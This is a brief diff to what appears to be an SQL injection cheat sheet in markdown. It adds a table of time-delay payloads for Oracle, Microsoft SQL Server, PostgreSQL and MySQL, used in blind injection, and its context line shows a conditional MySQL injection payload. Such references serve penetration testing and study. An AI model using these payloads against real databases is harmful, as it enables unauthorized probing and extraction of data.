@@ -55,3 +55,18 @@
 |```SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')```|*mysql*|
 
 -----
+
+
+#### time delays
+
+| syntax | type |
+|:---:|:---:|
+|```dbms_pipe.receive_message(('a'),10)```|*oracle*|
+|```WAITFOR DELAY '0:0:10'```|*microsoft*|
+|```SELECT pg_sleep(10)```|*postgresql*|
+|```SELECT sleep(10)```|*mysql*|
+
+-----
+
+
+####
